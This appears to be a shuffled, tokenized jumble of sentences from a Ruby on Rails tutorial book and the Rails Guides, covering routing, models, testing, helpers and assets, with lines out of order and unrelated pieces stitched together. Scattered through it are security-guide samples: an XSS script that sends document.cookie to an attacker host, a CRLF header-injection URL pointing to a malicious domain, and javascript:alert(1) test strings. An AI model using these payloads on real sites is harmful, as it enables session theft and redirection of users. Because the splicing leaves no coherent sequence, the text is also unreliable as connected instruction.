WARNING : Please do not report security vulnerabilities with public GitHub issue reports ▖
&lt; % = f ▖ text _ field : name % &gt;
Now for the implementation
▖ \ footnote {
layout &quot; main &quot;
javascript _ include _ tag &quot; common &quot; # = &gt; &lt; script src = &quot; / assets / common ▖ js &quot; &gt; &lt; / script &gt;
This test uses the \ kode { reload } method for reloading a value from the database and the \ kode { eq } method for testing equality .
By inspecting the \ href { https : / / github ▖ com / rails / rails / blob / master / activemodel / lib / active _ model / secure _ password ▖ rb } { secure password source code } , we find that this method is
We &apos;ll start with a test for the presence of a \ kode { name } attribute by building on the test in Listing ~ \ ref { code : valid _ user _ test } .
A symbol is tested against the bare constant name , a string is against the fully-qualified constant name .
There &apos;s also `slice ! ` which in addition to perform a slice in place returns what &apos;s removed :
scope path _ names : { new : &apos; make &apos; } do
Don &apos;t be surprised if it &apos;s tough going at first ; the blank slate of a new feature can be quite intimidating .
As a rule of thumb , use filenames relative to the application root :
NOTE ▖ If you are running in a multi-threaded environment , there could be a chance that several threads may be accessing multiple connections simultaneously ▖
NOTE ▖ Slicing may come in handy for sanitizing option hashes with a white list of keys .
This chapter is designed to give you a solid foundation in Rails-flavored Ruby , whether or not you have prior experience in the language .
Implement such a REST API for the sample application .
Because of the way Rails handles sessions , this process is secure ; if a malicious user tries to spoof the user id , Rails will detect a mismatch based on a special \ emph { session id } generated for each session .
In fact , one of the best ways to understand the associations is to use them in the web interface .
If this engine is to be used as a stand-alone engine , then you ╼ would add any customization to its layout in this file , rather than the ╼ application &apos;s `app / views / layouts / application ▖ html ▖ erb` file .
= &gt; { : name = &gt; &quot; Michael Hartl &quot; , : email = &gt; &quot; michael @ example ▖ com &quot; }
# Ruby on Rails Tutorial : &quot; hello , world ! &quot;
default _ scope { where state : &apos; pending &apos; }
In addition , since each row is a user , we would need to include the user &apos;s other attributes , including the name , email , password , etc .
&#91; &quot; 4 &quot; , &quot; 5 &quot; , nil &#93;
as shown in Listing ~ \ ref { code : new _ readme } .
This uses a \ kode { before } block to set the user &apos;s name to an invalid ( blank ) value and then checks that the resulting user object is not valid .
&quot; Admin : : Hotel : : ReservationUtils &quot; ▖ demodulize # = &gt; &quot; ReservationUtils &quot;
* ` : restrict _ with _ exception` causes an exception to be raised if there are any associated records
Listing ~ \ ref { code : gemfile _ sample _ app } is identical to Listing ~ \ ref { code : gemfile _ sqlite _ version } and Listing ~ \ ref { code : demo _ gemfile _ sqlite _ version _ redux } apart from the gems in the \ kode { test } group , which are needed for the optional advanced testing setup ( Section ~ \ ref { sec : advanced _ testing _ setup } ) .
But first , we &apos;ll create the class of administrative users , or \ emph { admins } , authorized to do so .
Fortunately , Factory Girl anticipates this issue , and provides \ emph { sequences } to solve it .
Finally , if necessary , we refactor the code , changing its form ( by eliminating duplication , for example ) without changing its function .
This isn &apos;t a \ emph { proof } that our code is still correct , but it greatly increases the probability , thereby providing a safety net to protect us against future bugs .
However , unlike application-wide layouts , partial layouts still have the underscore prefix .
Guard monitors changes in the filesystem so that , for example , when we change the \ kode { static \ _ pages \ _ controller \ _ test ▖ rb } file , only those tests get run .
Content-Type : * / * ; charset = utf-8
Although we &apos;ve defined the \ kode { password \ _ digest } attribute required by \ linebreak \ kode { has \ _ secure \ _ password } , sometimes it &apos;s convenient to refer to the plain ( virtual ) password as well .
in Listing ~ \ ref { code : layout _ flash } .
&#124; &#124; 407 &#124; : proxy _ authentication _ required &#124;
for &quot; level &quot; : String
The comments resource here will have the following routes generated for it :
To protect the \ kode { index } page from unauthorized access , we &apos;ll first add a short test to verify that the \ kode { index } action is redirected properly ( Listing ~ \ ref { code : index _ action _ redirected _ test } ) .
# &lt; c type = &quot; integer &quot; &gt; 3 &lt; / c &gt;
The \ emph { Rails Tutorial } is a book on web development , not web design , but it would be depressing to work on an application that looks like \ emph { complete } crap , so in this section we &apos;ll add some structure to the layout and give it some minimal styling with CSS ▖ In addition to using some custom CSS rules , we &apos;ll make use of \ href { http : / / getbootstrap ▖ com / } { Bootstrap } , an open-source web design framework from Twitter .
Because it is nominally an acronym for \ emph { asynchronous JavaScript and XML } , Ajax is sometimes misspelled ``AJAX &apos; &apos; , even though the \ href { http : / / www ▖ adaptivepath ▖ com / ideas / essays / archives / 000385 ▖ php } { original Ajax article } spells it as ``Ajax &apos; &apos; throughout .
To find the current user , one possibility is to use the \ kode { find } method , as on the user profile page ( Listing ~ \ ref { code : user _ show _ action } ) :
Calvin navigates to the profile of a second user , Thomas Hobbes ( Figure ~ \ ref { fig : page _ flow _ other _ profile _ follow _ button _ mockup } ) , clicking on the ``Follow &apos; &apos; button to follow that user .
t ▖ string : account _ number
in Listing ~ \ ref { code : spork _ guardfile } .
If a helper is specific to a particular controller , you should put it in the corresponding helper file ; for example , helpers for the Static Pages controller generally go in \ kode { app / helpers / static \ _ pages \ _ helper ▖ rb } .
t ▖ references : article , index : true
When the CDN can ╼ serve an asset directly the request never touches your Rails server ▖
The markup for a modern web page follows this form :
in Listing ~ \ ref { code : login _ form _ html } .
This guide does not dig into that process , but it &apos;s important to know that the file extension on your view controls the choice of template handler ▖
scope : active , where ( active : true )
A template appears in Listing ~ \ ref { code : home _ feed _ test } .
# in config / initializers / session _ store ▖ rb
% subsection backtrace _ silencer ( end ) ╼ ╼ \ subsection { Automated tests with Guard } % ( fold ) ╼ \ label { sec : guard } ╼ ╼
The \ kode { Micropost } class , highlighting inheritance .
Let &apos;s take a look at the generated mailers to get a sense of how they work ( Listing ~ \ ref { code : generated _ application _ mailer } and Listing ~ \ ref { code : generated _ user _ mailer } ) .
* Method parameters .
Even at this early stage , we &apos;re already going to deploy our ( still-empty ) Rails application to production .
+ --------- + --------- + ------- + ------ + ------------- +
get &apos; one &apos; = &gt; &apos; test # example &apos; , as : : example
Within the context of a layout , `yield` identifies a section where content from the view should be inserted ▖
In development mode , assets are served as separate files in the order they are ╼ specified in the manifest file .
We will see starting in Chapter ~ \ ref { cha : sign _ up } that initializing objects using a hash argument , a technique known as \ emph { mass assignment } , is common in Rails applications .
n { Using keyword arguments in the \ kode { gravatar \ _ for } helper ▖ \ \ \ filepath { app / helpers / users \ _ helper ▖ rb } } ╼ % = lang : ruby , options : &quot; hl _ lines &quot; : &#91; 4 &#93; ╼ \ begin { code } ╼ module UsersHelper ╼ ╼ # Returns the Gravatar for the given user ▖ ╼ def gravatar _ for ( user , size : 80 ) ╼ gravatar _ id = Digest : : MD5 : : hexdigest ( user ▖ email ▖ downcase ) ╼ gravatar _ url = &quot; https : / / secure ▖ gravatar ▖ com / avatar / # { gravatar _ id } ? s = # { size } &quot; ╼ image _ tag ( gravatar _ url , alt : user ▖ name , class : &quot; gravatar &quot; ) ╼ end ╼ end ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ % subsection a _ gravatar _ image ( end ) ╼ ╼ \ section { Signup form } % ( fold ) ╼ \ label { sec : signup _ form } ╼ ╼
Active Support defines `Hash # deep _ merge` ▖
The remember token cookie in the local browser .
&lt; a href = &apos; more ▖ html &apos; &gt; See more &lt; / a &gt; &quot; )
javascript _ include _ tag : defaults
&#124; GET &#124; / kategorien / : id &#124; categories # show &#124; category _ path ( : id ) &#124;
We encountered this idea briefly in the context of \ kode { reverse } in the \ kode { palindrome } method ( Section ~ \ ref { sec : a _ class _ of _ our _ own } ) , which also noted that \ kode { self } is \ emph { not } optional in an assignment , so
We &apos;ll start with a test for the presence of a \ kode { name } attribute by building on the test in Listing ~ \ ref { code : valid _ user _ test } .
# # # # `subclasses`
Here the storage mechanism for the forwarding URL is the same \ kode { session } facility we used in Section ~ \ ref { sec : a _ working _ log _ in _ method } to log the user in .
WARNING : The asset tag helpers do _ not _ verify the existence of the assets at the specified locations ; they simply assume that you know what you &apos;re doing and generate the link .
* `prepend _ helpers _ path` Adds the directory `app / helpers` from the application , railties and engines to the lookup path for helpers for the application .
If you want to update another branch :
What makes Rails so great ?
You can use the ` : constraints` option to specify a required format on the implicit `id` ▖
I recommend eventually learning how to install and configure PostgreSQL in development , but the chances are now is not that time .
$ ( &quot; a &#91; data-remote &#93; &quot; ) ▖ on &quot; ajax : success &quot; , ( e , data , status , xhr ) - &gt;
belongs _ to : patient
* `app / assets` is for assets that are owned by the application , such as custom ╼ images , JavaScript files or stylesheets .
There are now no strict dependencies on what the class is , only what the API for ╼ the class must be ▖
The users index view .
On the other hand , many beginning Rails developers are excited about making \ emph { web } applications , and would rather not wait to finish a whole book on Ruby before ever writing a single web page .
However , this isn &apos;t really all that helpful ▖
The \ kode { User } class , highlighting inheritance .
&lt; / tr &gt;
\ label { fig : signup _ failure _ mockup } } ╼ \ end { figure } ╼ ╼ \ subsection { A working form } % ( fold ) ╼ \ label { sec : a _ working _ form } ╼ ╼
&gt; &gt; Person ▖ new ▖ errors &#91; : name &#93; ▖ any ?
Knowing how to use a version control system is a required skill for every software developer .
Displaying Validation Errors in Views
Active Support provides `duplicable ? ` to programmatically query an object about this property :
The response \ kode { : success } is an abstract representation of the underlying HTTP \ href { http : / / en ▖ wikipedia ▖ org / wiki / List _ of _ HTTP _ status _ codes } { status code } ( in this case , \ href { http : / / en ▖ wikipedia ▖ org / wiki / List _ of _ HTTP _ status _ codes # 2xx _ Success } { 200 OK } ) .
mattr _ accessor : constant _ watch _ stack _ mutex
page to show micropost with id \ kode { 1 }
create _ table : accounts do &#124; t &#124;
As we &apos;ve seen throughout this tutorial , the usual Rails convention is to implicitly render the template corresponding to an action , such as rendering \ kode { show ▖ html ▖ erb } at the end of the \ kode { show } action .
delete a session ( log out )
At the moment , ╼ &quot; Welcome aboard &quot; is occupying that spot .
The initial spec for users , with a test for the signup page .
It &apos;s worth noting that this error-messages partial is only a first attempt ; the final version appears in Section ~ \ ref { sec : creating _ microposts } .
To use the mailer in our application , we just need to add a couple of lines to the \ kode { create } action used to sign users up , as shown in Listing ~ \ ref { code : user _ signup _ with _ account _ activation } .
# Precompile additional assets ( application ▖ js , application ▖ css , and all non-JS / CSS are already added )
Therefore , constraint values should match the corresponding Request object method return type ▖
Experience shows that , at the level of this tutorial , the costs associated with including such an explicit Ruby version number outweigh the ( negligible ) benefits , so you should ignore this warning for now .
\ emph { Extra credit : } Organize the support code into separate files and modules , and get everything to work by including the modules properly in the spec helper file .
as seen in Listing ~ \ ref { code : gemfile _ sqlite _ version } .
( I &apos;ve taken the liberty of associating the first few sample addresses with photos so that they &apos;re not all the default Gravatar image ▖ )
In addition , after an invalid submission Rails automatically wraps the fields with errors in \ kode { div } s with the CSS class \ kode { field \ _ with \ _ errors } .
To get links of the form
* `autoplay : true` , starts playing the video on page load .
* `config ▖ file _ watcher` the class used to detect file updates in the filesystem when `config ▖ reload _ classes _ only _ on _ change` is true ▖
One example is the \ kode { to \ _ s } method that can convert virtually any object to a string :
If you need to do more complex things with a default scope , you can alternatively ╼ define it as a class method :
You &apos;re now in a position to appreciate , at least vaguely , what this code means : \ kode { StaticPagesController } is a class that inherits from \ kode { ApplicationController } , and comes equipped with \ kode { home } , \ kode { help } , and \ kode { about } methods .
# = &gt; 12 ▖ 345 ▖ 678
# Rails &lt; 4 ▖ 1
http : / / www ▖ yourapplication ▖ com / controller / action ? referer = path / at / your / app % 0d % 0aLocation : + http : / / www ▖ malicious ▖ tld
# # # Mailer Views
As with the other routes , \ kode { get &apos; signup &apos; } automatically gives us the named route \ kode { signup \ _ path } , which we put to use in Listing ~ \ ref { code : home _ page _ signup _ link } .
For example , the page for listing all users is at \ href { http : / / localhost : 3000 / users } { / users } , and the ╼ page for making a new user is at \ href { http : / / localhost : 3000 / users / new } { / users / new } .
The `collection ▖ empty ? ` method returns `true` if the collection does not contain any associated objects .
as shown in Listing ~ \ ref { code : cgi _ escape } .
We can get the REST-style URL to work by adding a single line to our routes file ( \ kode { config / routes ▖ rb } ) :
years _ ago
The bottom line is that \ kode { : name = &gt; } and \ kode { name : } are effectively the same \ emph { only inside literal hashes } , so that
Merge the new content :
To filter the processes by type , you can run the results of \ texttt { ps } through the \ texttt { grep } pattern-matcher using a Unix pipe ~ \ texttt { &#124; } :
GH # 1234
# # # # number _ to _ currency
While we &apos;re at it , we &apos;ll follow a common web convention and link the logo to the Home page as well .
This ensures that the same version of Rails we installed in Listing ~ \ ref { code : installing _ rails } is used to create the first application &apos;s file structure .
In addition , some commands may produce errors depending on your system ; rather than attempt the \ href { http : / / en ▖ wikipedia ▖ org / wiki / Sisyphus } { Sisyphean } task of documenting all such errors in this tutorial , I will delegate to the ``Google the error message &apos; &apos; algorithm , which among other things is good practice for real-life software development .
as shown in Listing ~ \ ref { code : forget _ test } .
The first is the new Home page sidebar , as shown in Listing ~ \ ref { code : user _ info } .
Recalling that
Rails has several initializers that run on startup that are all defined by using the `initializer` method from `Rails : : Railtie` ▖
As a result , most web frameworks have a plethora of options for implementing such systems , and Rails is no exception .
Since \ texttt { nil } is false in a boolean context , the first assignment to \ texttt { @ foo } is \ texttt { nil &#124; &#124; &quot; bar &quot; } , which evaluates to \ texttt { &quot; bar &quot; } .
* Database Table - Plural with underscores separating words ( e ▖ g ▖ , `book _ clubs` ) .
This means that an ╼ application is able to have a path provided by a routing helper such as ╼ `articles _ path` and use an engine also that provides a path also called ╼ `articles _ path` , and the two would not clash ▖
* Rails 4 ▖ 0 has removed the XML parameters parser ▖
In Chapter ~ \ ref { cha : user _ microposts } , the result was only a proto-feed ( Figure ~ \ ref { fig : home _ with _ proto _ feed } ) , but with the implementation in Listing ~ \ ref { code : from _ users _ followed _ by _ final } as seen in Figure ~ \ ref { fig : home _ page _ with _ feed } the Home page now shows the full feed .
create app / assets / stylesheets / application ▖ css
$ bundle exec rake db : migrate RAILS _ ENV = production
In this context , such tests are sometimes known as \ emph { acceptance tests } , since they determine when a particular feature should be accepted as complete .
Note that it handles both ASCII and Unicode whitespace .
\ label { fig : demo _ new _ user _ rails _ 3 } } ╼ \ end { figure } ╼ ╼ \ noindent
`find _ by _ sql` provides you with a simple way of making custom calls to the database and retrieving instantiated objects .
def raw ( stringish )
RedCloth ▖ new ( &apos; &lt; script &gt; alert ( 1 ) &lt; / script &gt; &apos; ) ▖ to _ html
Comparing the console sessions for the various operators , we see that \ texttt { @ foo = @ foo &#124; &#124; &quot; bar &quot; } follows the \ texttt { x = x O y } pattern with \ texttt { &#124; &#124; } in the place of \ texttt { O } :
NOTE : All the following methods are defined in `active _ support / core _ ext / date / calculations ▖ rb` .
To get these tests to pass again and to get our form to render , we must define an \ kode { @ user } variable in the controller action corresponding to \ kode { new ▖ html ▖ erb } , i ▖ e ▖ , the \ kode { new } action in the Users controller .
The next set of tests makes sure that , for signed-in users , the index page has the right title / content and lists all of the site &apos;s users .
The \ kode { Feature } and \ kode { Scenario } lines are mainly for documentation , but each of the other lines needs some corresponding Ruby .
The updated partials appear in Listing ~ \ ref { code : follow _ form _ ajax } and Listing ~ \ ref { code : unfollow _ form _ ajax } .
In particular , \ kode { Rails ▖ env ▖ development ? } \ is \ kode { true } only in a development environment , so the embedded Ruby
&#124; `Person` &#124; `people` &#124;
We end our tour of Ruby with a complete class of our own , a \ kode { User } class that anticipates the User model coming up in Chapter ~ \ ref { cha : modeling _ users } .
A partial for the HTML shim .
A custom Home page .
class Application &lt; Rails : : Application
For example ╼ instead of using
* `assert _ generates`
To create a new controller , you will need to run the &quot; controller &quot; generator and ╼ tell it you want a controller called &quot; welcome &quot; with an action called &quot; index &quot; , ╼ just like this :
in Listing ~ \ ref { code : generate _ user _ model } .
Since \ texttt { nil } is false in a boolean context , the first assignment is \ texttt { nil &#124; &#124; &quot; the user &quot; } , which evaluates to \ texttt { &quot; the user &quot; } ; similarly , the second assignment is \ texttt { &quot; the user &quot; &#124; &#124; &quot; another user &quot; } , which also evaluates to \ texttt { &quot; the user &quot; } ---since strings are \ texttt { true } in a boolean context , the series of \ texttt { &#124; &#124; } expressions terminates after the first expression is evaluated .
Testing the \ kode { index } action redirect ▖
( Although the \ kode { authenticated ? } \ method in Listing ~ \ ref { code : authenticated _ p } is tied specifically to the remember digest , it will turn out to be useful in other contexts as well , and we &apos;ll generalize it in Chapter ~ \ ref { cha : account _ activation } ▖ )
We &apos;ll start by making a partial to display the following and follower statistics on the profile and home pages .
You should feel free to visit the signup page and create a new user at this time .
- &gt; 0 ▖ 0023s
The view for the Help page with an embedded Ruby title ▖
Action Mailer Configuration
New routes are defined in the file \ kode { config / routes ▖ rb } .
The syntax
This technique should be used with caution .
Creating a resourceful route will also expose a number of helpers to the controllers in your application ▖
If the above sequence seems implausible , believe me , it isn &apos;t : it can happen on any Rails website with significant traffic ( which I once learned the hard way ) .
In particular , simple routing makes it very easy to map legacy URLs to new Rails actions .
assemblies ▖ find ( ▖ ▖ ▖ )
&lt; div style = &quot; background : url ( &apos; javascript : alert ( 1 ) &apos; ) &quot; &gt;
&lt; h1 &gt; New Article &lt; / h1 &gt;
/ microposts / new
as shown in Listing ~ \ ref { code : Gemfile _ pg _ gem } .
&lt; script &gt; document ▖ write ( &apos; &lt; img src = &quot; http : / / www ▖ attacker ▖ com / &apos; + document ▖ cookie + &apos; &quot; &gt; &apos; ) ; &lt; / script &gt;
It &apos;s time to create a second one , the Users controller .
Note that we write the commit message in the \ emph { present } tense .
* Rails 4 ▖ 0 has removed `ActionDispatch : : BestStandardsSupport` middleware , ` &lt; ! DOCTYPE html &gt; ` already triggers standards mode per http : / / msdn ▖ microsoft ▖ com / en-us / library / jj676915 ( v = vs ▖ 85 ) ▖ aspx and ChromeFrame header has been moved to `config ▖ action _ dispatch ▖ default _ headers` .
`beginning _ of _ quarter` is aliased to `at _ beginning _ of _ quarter` , and `end _ of _ quarter` is aliased to `at _ end _ of _ quarter` .
Null Relation
Of course , after this minor refactoring the test suite should still be \ passing :
rake db : migrate SCOPE = blorgh
The second \ kode { link \ _ to } shows off the \ kode { image \ _ tag } helper , which takes as arguments the path to an image and an optional options hash , in this case setting the \ kode { alt } attribute of the image tag using symbols .
# # # Conversions
( Don &apos;t worry about the Ruby syntax right now ; it will be covered in more depth in Chapter ~ \ ref { cha : rails _ flavored _ ruby } ▖ )
Defaults to `true` ▖ ╼
# # # Retrieving a Single Object
\ href { http : / / screencasts ▖ railstutorial ▖ org / } { The Ruby on Rails Tutorial screencasts } : I offer a full-length screencast course based on this book .
in Listing ~ \ ref { code : password _ implementation } .
Since a user object is neither \ kode { nil } nor \ kode { false } , it does the job nicely
The \ kode { &lt; nav &gt; } tag , though formally unnecessary here , is used to more clearly communicate the purpose of the navigation links .
Putting all this together gives the updated micropost fixtures in Listing ~ \ ref { code : updated _ micropost _ fixtures } .
By the way , if you ever make a mistake when generating code , it &apos;s useful to know how to reverse the process .
You should use this helper when your model has associations with other models ╼ and they also need to be validated ▖
* Avoiding name collisions
* `before _ perform`
# # # # # `create _ association ( attributes = { } ) `
In this section of the guide you &apos;ll learn how to setup the tests on your own computer .
Study the entry in the Rails API for the \ kode { validates } method to learn more about its capabilities and options .
# # # # `to _ formatted _ s`
Of course , currently user activation doesn &apos;t actually \ emph { do } anything , because we haven &apos;t changed how users log in .
If there &apos;s any element that does not belong to the type of the first one the root node becomes &quot; objects &quot; :
The string &apos; foobar &apos; is nonempty .
Before filters use the \ kode { before \ _ action } command to arrange for a particular method to be called before the given actions
# If the user is locked the increment is lost , no big deal .
There are no formal prerequisites to this book---the \ emph { Ruby on Rails Tutorial } contains integrated tutorials not only for Rails , but also for the underlying Ruby language , the default Rails testing framework ( MiniTest ) , the Unix command line , \ href { http : / / en ▖ wikipedia ▖ org / wiki / HTML } { HTML } , \ href { http : / / en ▖ wikipedia ▖ org / wiki / CSS } { CSS } , a small amount of \ href { http : / / en ▖ wikipedia ▖ org / wiki / JavaScript } { JavaScript } , and even a little \ href { http : / / en ▖ wikipedia ▖ org / wiki / SQL } { SQL } .
* For `belongs _ to` associations , `has _ many` inverse associations are ignored .
If any INSERT or UPDATE takes place then the cache is cleaned .
* How to find records using a variety of methods and conditions .
* `Time` understands DST , so you get correct DST calculations as in
For example , this association uses two such options :
The application code simply involves calling \ kode { log \ _ out } only if \ kode { logged \ _ in ? } \ is true , as shown in Listing ~ \ ref { code : destroy _ forget } .
class _ attribute : x
* `resource _ controller` defines which generator to use for generating a controller when using `rails generate resource` ▖
If your change has an impact on the performance of Rails , please use the ╼ &#91; benchmark-ips &#93; ( https : / / github ▖ com / evanphx / benchmark-ips ) gem to provide ╼ benchmark results for comparison .
# # # The Rake Task
* ` : authentication` - If your mail server requires authentication , you need to specify the authentication type here ▖
As we &apos;ll see , many of the steps are similar , and we will have several opportunities to apply the lessons learned in Section ~ \ ref { sec : account _ activation } .
Since `errors &#91; : base &#93; ` is an array , you can simply add a string to it and it will be used as an error message .
A mockup of the user followers page .
ExpiresDefault &quot; access plus 1 year &quot;
This prevents a third-party site from referencing ╼ your JavaScript URL and attempting to run it to extract sensitive data .
* FROM `articles` WHERE `articles` ▖ `user _ id` IN ( 1 )
For a freshly generated Rails application , this might produce something like :
to get to the same place , but \ kode { / about } is more succinct .
Logging in the user upon signup .
# = &gt; Tue , 09 Aug 2011 23 : 15 : 17 + 0000
If you &apos;d like to share your progress at this point , feel free to send a tweet or Facebook status update with something like this :
This table should be created without a primary key :
\ href { http : / / www ▖ thinkful ▖ com / a / railstutorial } { Thinkful } : An online class that pairs you with a professional engineer as you work through a project-based curriculum
All of the above methods return an instance of `ActiveRecord : : Relation` .
Besides that , one can use `deep _ transform _ keys` and `deep _ transform _ keys ! ` to perform the block operation on all the keys in the given hash and all the hashes nested into it ▖
class Physician &lt; ActiveRecord : : Base
d ▖ prev _ year # = &gt; Fri , 08 May 2009
literal ``at sign &apos; &apos;
Now that we have a helper , we can use it to simplify our layout by replacing
in the Micropost model .
\ kode { f ▖ object } is \ kode { @ micropost } , etc .
With the \ kode { signed \ _ in ? } \ method in hand , we &apos;re ready to finish the layout links .
get &apos; photos / : id &apos; , to : &apos; photos # show &apos; , constraints : { id : / &#91; A-Z &#93; \ d { 5 } / }
Because of the \ linebreak \ kode { navbar-fixed-top } class in the \ kode { header } tag , Bootstrap fixes the navigation bar to the top of the page , so the padding serves to separate the main text from the navigation .
Rails ╼ will default to `text / plain` otherwise .
Although people are sometimes sloppy about including the \ kode { alt } attribute for images , it is in fact required by the HTML standard .
Although we won &apos;t need the Microposts controller until Section ~ \ ref { sec : manipulating _ microposts } , we will need the views directory in just a moment , so let &apos;s generate the controller now :
* `before _ configuration` : This is run as soon as the application constant inherits from `Rails : : Application` ▖
# = &gt; &quot; 2009-10-25 ▖ ▖ 2009-10-26 &quot;
The default is ` &quot; @ _ % s &quot; ` .
The following link presented a page which stated that &quot; George Bush appointed a 9 year old boy to be the chairperson ▖ ▖ ▖ &quot; :
╼ ╼ \ section { A Micropost model } % ( fold ) ╼ \ label { sec : a _ micropost _ model } ╼ ╼
The contents of the partial appear in Listing ~ \ ref { code : errors _ partial } .
Escape any input value using the h ( ) method .
As you might guess , in addition to \ kode { patch } Rails tests support \ kode { get } , \ kode { post } , and \ kode { delete } as well ▖ )
as shown in Listing ~ \ ref { code : micropost _ order _ test } .
get &apos; search&apos;
Note also that we take care to \ kode { upcase } the user &apos;s email address to make sure our ability to find the user in the database is case-insensitive .
\ href { http : / / railscasts ▖ com / } { RailsCasts } by Ryan Bates : Excellent ( mostly ) free Rails screencasts
Using an engine within an application is very easy ▖
NOTE : The `ApplicationController` class being inherited from here is the ╼ `Blorgh : : ApplicationController` , not an application &apos;s `ApplicationController` .
If you &apos;d like to use a different status code , perhaps 301 , a permanent redirect , you can use the ` : status` option :
Go ahead , play around with the ╼ newly mounted engine ▖
# # # Layouts
# = &gt; { : a = &gt; 1 }
In this section , we &apos;ll take the first steps toward the final profile by making a page to display a user &apos;s name and profile photo , as indicated by the mockup in Figure ~ \ ref { fig : profile _ mockup _ profile _ name }
You can pass in a numerical argument to the `last` method to return up to that number of results ▖
We &apos;ll put this fact to good use starting in Section ~ \ ref { sec : showing _ microposts } ▖ )
For example , if each supplier has one account , and each account is associated with one account history , then the ╼ supplier model could look like this :
Once you &apos;ve created the \ kode { about ▖ html ▖ erb } file in the right directory , you should fill it with the contents shown in Listing ~ \ ref { code : custom _ about _ page } .
╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : toy _ app _ what _ we _ learned _ in _ this _ chapter } ╼ ╼ \ begin { itemize } ╼ ╼ \ item
* any other object that responds to `empty ? ` and is empty .
as seen in Listing ~ \ ref { code : application _ layout _ full _ title } .
* X-Content-Security-Policy
This method receives a hash with keys ` : years` , ` : months` , ` : weeks` , ` : days` , and returns a date advanced as much as the present keys indicate :
* `config ▖ beginning _ of _ week` sets the default beginning of week for the ╼ application ▖
This may be handy for example to get a better name :
By including both the \ kode { user \ _ id } and \ kode { created \ _ at } columns as an array , we arrange for Rails to create a \ emph { multiple key index } , which means that Active Record uses \ emph { both } keys at the same time .
A partial for displaying follower stats .
When writing CoffeeScript , you &apos;ll often want to do some sort of processing upon ╼ page load ▖
JavaScript can also make requests to the server , and parse the response ▖
See &#91; Security Guide &#93; ( security ▖ html # unsafe-query-generation ) ╼ for more information ▖
So first , let &apos;s add the delete link in the ╼ `app / views / comments / _ comment ▖ html ▖ erb` partial :
Because we &apos;re modeling activations using an Account Activations resource , the token itself can appear as the argument of the named route defined in Listing ~ \ ref { code : account _ activations _ route } :
Note that Listing ~ \ ref { code : a _ test _ for _ valid _ submission } also verifies that the user show template renders following successful signup .
Of course , requiring users to log in isn &apos;t quite enough ; users should only be allowed to edit their \ emph { own } information .
Creating a New Rails Project
A ▖ x = : a
If you don &apos;t already have it , you should \ href { http : / / rubyforge ▖ org / frs / ? group _ id = 126 } { download RubyGems } , extract it , and then go to the \ kode { rubygems } directory and run the setup program :
but Rails allows us to link directly to the user , in this context automatically converting \ kode { current \ _ user } into \ kode { user \ _ path ( current \ _ user ) } .
Thus , tokens are validated by unmasking and then decrypting ▖
Thanks to running \ kode { rails new } in Section ~ \ ref { sec : the _ first _ application } and \ kode { bundle install } in Section ~ \ ref { sec : bundler } , we already have an application we can run---but how ?
#
Implement it and click on a pagination link to see why .
* X-Frame-Options
* &#91; Introducing Rack &#93; ( http : / / chneukirchen ▖ org / blog / archive / 2007 / 02 / introducing-rack ▖ html )
# &lt; Client id : 2 , first _ name : &quot; Jan &quot; &gt; ,
Returns an instance of the class `ActiveModel : : Errors` containing all errors ▖
Similarly , you can retrieve ` @ product ▖ pictures` .
page to edit user with id \ kode { 1 }
make : / usr / bin / gcc-4 ▖ 2 : No such file or directory
( If you happen to be in the third category , soon you won &apos;t be any longer ▖ )
We &apos;ll focus now on using active relationships to generate a list of followed users , and consider the passive case in Section ~ \ ref { sec : followers } .
# # # Active Model
&lt; p &gt; Employee : &lt; % = employee ▖ name % &gt; &lt; / p &gt;
&lt; a href = &quot; # &quot; onclick = &quot; paintIt ( this , &apos; # 990000 &apos; ) &quot; &gt; Paint it red &lt; / a &gt;
DateTime ▖ current ▖ change ( month : 2 , day : 30 )
╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ % subsection route _ tests ( end ) ╼ ╼ \ subsection { Rails routes } % ( fold ) ╼ \ label { sec : rails _ routes } ╼ ╼ To add the named routes for the sample app &apos;s static pages , we &apos;ll edit the routes file , \ kode { config / \ -routes ▖ rb } , that Rails uses to define URL mappings ▖
There is at least one exception , however : The output has to be escaped in the controller already , if the action doesn &apos;t render a view .
The hypertext transfer protocol ( \ href { http : / / en ▖ wikipedia ▖ org / wiki / Hypertext _ Transfer _ Protocol # Request _ methods } { HTTP } ) defines the basic operations \ texttt { GET } , \ texttt { POST } , \ texttt { PATCH } , and \ texttt { DELETE } .
To run a single test against all adapters , use :
We end our discussion of the toy application with a brief description of the controller and model class hierarchies in Rails .
# # # # `first ( limit = 1 ) `
# # # # Follow the Coding Conventions
With ` : allow _ nil` the call `user ▖ name` returns `nil` if the user has no profile .
Loading development environment
# = &gt; Returns all names , even if there are duplicates
In the present case , we want to use the \ kode { index } action in the Users controller , which we can arrange using the code shown in Listing ~ \ ref { code : rails _ routes _ root _ route } .
The second argument , `indent _ string` , specifies which indent string to use ▖
a
It also causes the engine &apos;s routes to ╼ be isolated from those routes that are within the application ▖
in Listing ~ \ ref { code : relationship _ create _ test } and
Rails layouts allow the use of a common template for pages in our application , thereby eliminating duplication .
A recap of the initial User pages spec .
The result appears in Listing ~ \ ref { code : log _ out _ with _ _ close _ browser }
&#124; DELETE &#124; / photos / : id &#124; photos # destroy &#124; image _ path ( : id ) &#124;
As a result , we get the best of both worlds : multiple nicely formatted files for programmer convenience , with single optimized files in production .
By default , files are loaded from `public / audios` .
The method `deep _ merge ! ` performs a deep merge in place .
to actually visit the target page .
Your editor may display a message like ``invalid multibyte character &apos; &apos; , but this is not a cause for concern .
duplicate # = &gt; &#91; &apos; string &apos; , &apos; another-string &apos; &#93;
The result appears in Figure ~ \ ref { fig : heroku _ app } .
has _ and _ belongs _ to _ many : clients
There are 10 kinds of people in the world : Those who like the ternary operator , those who don &apos;t , and those who don &apos;t know about it .
It &apos;s probably not entirely clear at this point why putting your source under version control does you any good , so let me give just one example .
Before you can start building the application , ╼ you need to make sure that you have Rails itself installed .
This is a definite improvement , but we can do even better : we can call \ kode { render } \ emph { directly } on the \ kode { @ users } variable ( Listing ~ \ ref { code : index _ final _ refactoring } ) .
This file allows you to specify a layout ╼ for the engine ▖
This mode uses more memory , performs more poorly than the default and is not ╼ recommended .
╼ end
To add page titles , we need to learn ( or review ) the structure of a typical web page , which takes the form shown in Listing ~ \ ref { code : html _ structure } .
The entire HTML skeleton structure is repeated on each page .
Before filters give a standard way to run methods before particular controller actions .
the \ kode { reverse \ _ relationships } association uses \ kode { followed \ _ id } :
create app / models / user ▖ rb
